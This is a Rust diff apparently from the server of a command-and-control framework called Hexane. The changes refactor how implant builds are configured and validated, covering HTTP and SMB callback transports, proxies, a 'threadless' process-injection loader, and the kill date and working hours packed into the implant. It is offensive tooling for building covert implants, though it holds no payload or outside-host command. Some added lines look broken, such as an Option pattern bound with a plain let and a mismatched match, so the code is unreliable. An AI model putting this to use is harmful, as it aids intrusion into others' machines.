@@ -1,17 +1,16 @@
 use std::fs;
 use rand::Rng;
 use std::str::FromStr;
+use std::borrow::Borrow;
 
 use crate::server::INSTANCES;
 use crate::server::session::{CURDIR, SESSION, USERAGENT};
-use crate::server::types::{InjectionOptions, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, TransportType, JsonData, BuildType};
+use crate::server::types::{NetworkType, InjectionOptions, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData, BuildType};
 use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::error::{Error, Result};
 use crate::server::utils::wrap_message;
 use crate::server::stream::Stream;
-
 use crate::{return_error, length_check_defer};
-use crate::server::types::TransportType::TransportHttp;
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     length_check_defer!(args, 3);
@@ -27,7 +26,7 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     instance.user_session.username = session.username.clone();
     instance.user_session.is_admin = session.is_admin.clone();
 
-    if instance.network_type != TransportHttp as u8 {
+    if instance.network_type != NetworkType::Http as u8 {
         instance.setup_listener()?;
     }
 
@@ -56,8 +55,8 @@ pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
 
 
 pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
-    todo!()
-    // todo: get channels + saved messages from db
+    // todo:: implement
+    Ok(())
 }
 
 pub fn map_config(file_path: &String) -> Result<Hexane> {
@@ -70,10 +69,10 @@ pub fn map_config(file_path: &String) -> Result<Hexane> {
 
     instance.group_id       = 0;
     instance.main           = json_data.config;
-    instance.network        = json_data.network;
-    instance.builder        = json_data.builder;
     instance.loader         = json_data.loader;
-    instance.user_session   = UserSession::default();
+    instance.builder        = json_data.builder;
+    instance.network        = json_data.network;
+    instance.user_session   = **SESSION.lock().unwrap();
 
     Ok(instance)
 }
@@ -93,9 +92,9 @@ pub struct Hexane {
     pub(crate) active:          bool,
 
     pub(crate) main:            Config,
-    pub(crate) compiler:        Compiler,
-    pub(crate) network:         Network,
     pub(crate) builder:         Builder,
+    pub(crate) compiler:        Compiler,
+    pub(crate) network:         Option<Network>, // says "optional" but is checked for in config
     pub(crate) loader:          Option<Loader>,
     pub(crate) user_session:    UserSession,
 }
@@ -133,58 +132,59 @@ impl Hexane {
         if self.builder.output_name.is_empty()      { return_error!("a name for the build must be provided") }
         if self.builder.root_directory.is_empty()   { return_error!("a root directory for implant files must be provided") }
 
-        if let Some(linker_script) = &self.builder.linker_script {
+        if let Some(linker_script) = self.builder.linker_script.borrow() {
             if linker_script.is_empty() { return_error!("linker_script field found but linker script path must be provided") }
         }
 
-        if let Some(modules) = &self.builder.loaded_modules {
+        if let Some(modules) = self.builder.loaded_modules.borrow() {
             if modules.is_empty() { return_error!("loaded_modules field found but module names must be provided") }
         }
 
-        if let Some(deps) = &self.builder.dependencies {
+        if let Some(deps) = self.builder.dependencies.borrow() {
             if deps.is_empty() { return_error!("builder dependencies field found but dependencies must be provided") }
         }
 
-        if let Some(inc) = &self.builder.include_directories {
+        if let Some(inc) = self.builder.include_directories.borrow() {
             if inc.is_empty() { return_error!("builder include_directories field found but include directories must be provided") }
         }
 
-        match &mut self.network.options {
-            NetworkOptions::Http(http) => {
+        if let Some(network) = self.network.as_mut() {
+            match (&mut network.r#type, &mut network.options) {
 
-                if http.address.is_empty()      { return_error!("a valid return url must be provided") }
-                if http.endpoints.is_empty()    { return_error!("at least one valid endpoint must be provided") }
-                if http.useragent.is_none()     { http.useragent = Some(USERAGENT.to_string()); }
+                (NetworkType::Http, NetworkOptions::Http(http)) => {
+                    if http.address.is_empty()      { return_error!("a valid return url must be provided") }
+                    if http.endpoints.is_empty()    { return_error!("at least one valid endpoint must be provided") }
+                    if http.useragent.is_none()     { http.useragent = Some(USERAGENT.to_string()); }
 
-                if let Some(headers) = &http.headers {
-                    if headers.is_empty() { return_error!("http header field found but names must be provided") }
-                }
-
-                if let Some(domain) = &http.domain {
-                    if domain.is_empty() { return_error!("domain name field found but domain name must be provided") }
-                }
-
-                // todo: proxy should not be exclusive to http (socks5, ftp, smtp etc)
-                if let Some(proxy) = &http.proxy {
-                    if proxy.address.is_empty() { return_error!("proxy field detected but proxy address must be provided") }
-                    if proxy.proto.is_empty()   { return_error!("proxy protocol must be provided") }
-
-                    if let Some(username) = &proxy.username {
-                        if username.is_empty() { return_error!("proxy username field detected but the username was not provided") }
+                    if let Some(headers) = &http.headers {
+                        if headers.is_empty()       { return_error!("http header field found but names must be provided") }
+                    }
+                    if let Some(domain) = &http.domain {
+                        if domain.is_empty()        { return_error!("domain name field found but domain name must be provided") }
                     }
 
-                    if let Some(password) = &proxy.password {
-                        if password.is_empty() { return_error!("proxy password field detected but the password was not provided") }
-                    }
-                }
-            },
+                    if let Some(proxy) = &http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
+                        if proxy.address.is_empty() { return_error!("proxy field detected but proxy address must be provided") }
+                        if proxy.proto.is_empty()   { return_error!("proxy protocol must be provided") }
 
-            NetworkOptions::Smb(smb) => {
-                if smb.egress_peer.is_empty() { return_error!("an implant type of smb must provide the name of it's parent node") }
+                        if let Some(username) = &proxy.username {
+                            if username.is_empty()  { return_error!("proxy username field detected but the username was not provided") }
+                        }
+                        if let Some(password) = &proxy.password {
+                            if password.is_empty()  { return_error!("proxy password field detected but the password was not provided") }
+                        }
+                    }
+                },
+
+                (NetworkType::Smb, NetworkOptions::Smb(smb)) => {
+                    if smb.egress_peer.is_empty() { return_error!("an implant type of smb must provide the name of it's parent node") }
+                },
+
+                _ => return_error!("network config is invalid or does not match the specified type")
             }
         }
 
-        if let Some(loader) = &mut self.loader {
+        if let Some(loader) = self.loader.as_mut() {
             self.build_type = BuildType::Loader as u32;
 
             if loader.root_directory.is_empty() { return_error!("loader field detected but root_directory must be provided")}
@@ -201,6 +201,7 @@ impl Hexane {
 
             match &mut loader.injection.options {
                 InjectionOptions::Threadless(threadless) => {
+
                     if threadless.execute_object.is_empty()     { return_error!("loader field detected 'threadless' injection but an execute_object must be provided")}
                     if threadless.loader_assembly.is_empty()    { return_error!("loader field detected 'threadless' injection but a loader_assembly must be provided")}
                     if threadless.target_process.is_empty()     { return_error!("loader field detected 'threadless' injection but a target_process must be provided")}
@@ -231,14 +232,17 @@ impl Hexane {
         Ok(())
     }
 
-    fn create_binary_patch(&self) -> Result<Vec<u8>> {
+    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
         let mut stream = Stream::new();
 
-        if self.network_type == TransportHttp as u8 {
-            stream.pack_byte(TransportHttp as u8);
+        let http    = NetworkType::Http as u8;
+        let smb     = NetworkType::Smb as u8;
 
-        } else if self.network_type == TransportType::TransportPipe as u8 {
-            stream.pack_byte(TransportType::TransportPipe as u8);
+        if self.network_type == http {
+            stream.pack_byte(http);
+
+        } else if self.network_type == smb {
+            stream.pack_byte(smb);
 
         } else {
             return_error!("invalid network type")
@@ -270,13 +274,13 @@ impl Hexane {
         }
 
         let working_hours = if let Some(ref hours) = self.main.working_hours {
-            i32::from_str(hours).map_err(Error::ParseInt)?
+            i32::from_str(hours)?
         } else {
             0
         };
 
         let kill_date = if let Some(ref date) = self.main.killdate {
-            i64::from_str(date).map_err(Error::ParseInt)?
+            i64::from_str(date)?
         } else {
             0
         };
@@ -284,7 +288,9 @@ impl Hexane {
         stream.pack_int32(working_hours);
         stream.pack_dword64(kill_date);
 
-        match &self.network.options {
+        let Some(options) = self.network.as_mut();
+        match options {
+
             NetworkOptions::Http(ref http) => {
                 stream.pack_wstring(http.useragent.as_ref().unwrap().as_str());
                 stream.pack_wstring(&http.address);
